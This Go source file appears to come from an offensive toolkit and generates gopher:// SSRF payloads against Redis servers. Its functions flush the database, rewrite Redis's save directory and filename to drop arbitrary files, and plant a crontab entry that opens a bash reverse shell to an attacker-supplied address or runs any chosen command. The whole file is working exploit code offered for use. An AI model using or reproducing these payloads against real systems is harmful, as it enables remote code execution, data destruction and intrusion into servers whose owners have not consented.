package gopher

import (
	"fmt"
	"net/url"
	"strings"

	"github.com/virzz/virzz/logger"
	"github.com/virzz/virzz/utils"
)

func expRedisCmd(addr, path, name, data string) (string, error) {
	logger.Debug("path: ", path, "name: ", name, "data: ", data)
	ps := []string{
		"*1", "$8", "flushall",
		"*3", "$3", "set", "$3", "xxx", fmt.Sprintf("$%d", len(data)), data,
		"*4", "$6", "config", "$3", "set", "$3", "dir", fmt.Sprintf("$%d", len(path)), path,
		"*4", "$6", "config", "$3", "set", "$10", "dbfilename", fmt.Sprintf("$%d", len(name)), name,
		"*1", "$4", "save",
		"*1", "$4", "quit",
		"",
	}
	p := url.QueryEscape(strings.Join(ps, "\r\n"))
	return fmt.Sprintf("gopher://%s/_%s", addr, replaceRedisPayload(p)), nil
}

func expRedisReverseShell(addr, path, name, reverseAddr string) (string, error) {
	ip, port, err := utils.ParseAddr(reverseAddr)
	if err != nil {
		return "", err
	}
	cmd := fmt.Sprintf("\n\n\n\n*/1 * * * * sh -c \"bash -i >& /dev/tcp/%s/%d 0>&1\"\n\n\n\n", ip, port)
	return expRedisCmd(addr, path, name, cmd)
}

func expRedisCrontabFile(addr, path, name, cmd string) (string, error) {
	cmd = fmt.Sprintf("\n\n\n\n*/1 * * * * sh -c \"%s\"\n\n\n\n", cmd)
	return expRedisCmd(addr, path, name, cmd)
}
